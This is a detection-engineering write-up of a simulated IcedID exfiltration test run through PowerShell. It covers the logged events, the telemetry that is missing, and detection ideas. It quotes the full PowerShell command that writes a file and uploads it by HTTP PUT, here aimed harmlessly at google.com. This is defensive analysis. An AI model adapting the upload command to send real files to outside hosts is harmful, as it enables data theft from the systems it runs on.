# T1020-1: Automated Exfiltration — IcedID Botnet HTTP PUT

## Technique Context

T1020 - Automated Exfiltration represents adversaries using automated methods to collect and exfiltrate data from compromised systems. This technique is particularly significant because it reduces the manual overhead for attackers while potentially operating at scale across multiple victims. The IcedID banking trojan, specifically, has been observed using HTTP PUT requests to exfiltrate stolen data to command and control infrastructure. Detection engineers focus on identifying unusual outbound HTTP traffic patterns, especially PUT/POST requests to suspicious domains, automated file collection behaviors, and the combination of file creation followed immediately by network transmission.

## What This Dataset Contains

This dataset captures a simulated IcedID exfiltration scenario executed via PowerShell. The core technique telemetry shows:

**Process Chain**: The test executes through multiple PowerShell processes, with Security event 4688 showing the key process creation: `"powershell.exe" & {$fileName = "C:\temp\T1020_exfilFile.txt"; $url = "https://google.com"; $file = New-Item -Force $fileName -Value "This is ART IcedID Botnet Exfil Test"; $contentType = "application/octet-stream"; try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}}`

**File Creation**: Sysmon EID 11 captures the creation of the exfiltration target file: `C:\temp\T1020_exfilFile.txt` with the test payload "This is ART IcedID Botnet Exfil Test"

**PowerShell Command Telemetry**: PowerShell EID 4103 events show the New-Item cmdlet creating the file and the Invoke-WebRequest cmdlet attempting the HTTP PUT operation with parameters: `Uri="https://google.com/", Method="Put", ContentType="application/octet-stream", InFile="C:\temp\T1020_exfilFile.txt"`

**Exfiltration Attempt Failure**: PowerShell EID 4100 captures the expected failure: "405. That's an error. The request method PUT is inappropriate for the URL /. That's all we know." - Google.com rejects the PUT request as expected.

**Sysmon Process Monitoring**: EID 1 events capture both the parent PowerShell process and child whoami.exe execution, with full command-line visibility showing the complete exfiltration script.

## What This Dataset Does Not Contain

The dataset lacks several elements that would be present in real-world IcedID exfiltration:

**Network Traffic Details**: While we see the PowerShell web request attempt, there are no Sysmon EID 3 network connection events, likely because the HTTP client libraries handle connection management internally and the request fails quickly.

**DNS Resolution**: No Sysmon EID 22 DNS events for google.com resolution, suggesting either DNS caching or the request failing before DNS resolution.

**Successful Exfiltration**: The technique demonstrates the attempt but not completion, as Google.com properly rejects the PUT method. Real IcedID would target attacker-controlled infrastructure that accepts the data.

**Data Collection Phase**: This test only shows the transmission attempt, not the typical IcedID behavior of collecting sensitive files, browser data, or credentials before exfiltration.

**Persistence Mechanisms**: No registry modifications or scheduled tasks that real IcedID would establish for ongoing data theft operations.

## Assessment

This dataset provides excellent visibility into the PowerShell-based exfiltration attempt pattern, with particularly strong coverage from the PowerShell operational logs showing both script block creation and command invocation details. The Security audit logs complement this with full command-line process creation events. However, the network layer visibility is limited due to the technique's failure mode - successful exfiltration would generate more network-related telemetry. The dataset is most valuable for detecting the preparation and attempt phases of automated exfiltration rather than the data transmission itself.

## Detection Opportunities Present in This Data

1. **PowerShell HTTP PUT/POST Operations**: PowerShell EID 4103 CommandInvocation events showing Invoke-WebRequest with Method="Put" and InFile parameters indicate potential exfiltration attempts.

2. **File Creation Followed by Network Activity**: Correlation between Sysmon EID 11 file creation in temp directories and immediate PowerShell web request commands within the same process context.

3. **Base64 or Binary Content-Type Requests**: PowerShell commands specifying "application/octet-stream" Content-Type combined with InFile parameters suggest binary data exfiltration.

4. **PowerShell Script Block Patterns**: EID 4104 script blocks containing New-Item, Invoke-WebRequest, and try/catch error handling in sequence match automated exfiltration frameworks.

5. **Suspicious File Creation Locations**: Sysmon EID 11 events for files created in C:\temp\ with names containing "exfil", "data", or similar terms combined with immediate deletion or transmission.

6. **Process Command Line Anomalies**: Security EID 4688 events showing PowerShell processes with embedded HTTP methods (PUT/POST) and URL parameters in the command line.

7. **PowerShell Error Patterns**: PowerShell EID 4100 error events indicating HTTP method rejections (405 errors) may reveal failed exfiltration attempts against hardened or inappropriate targets.
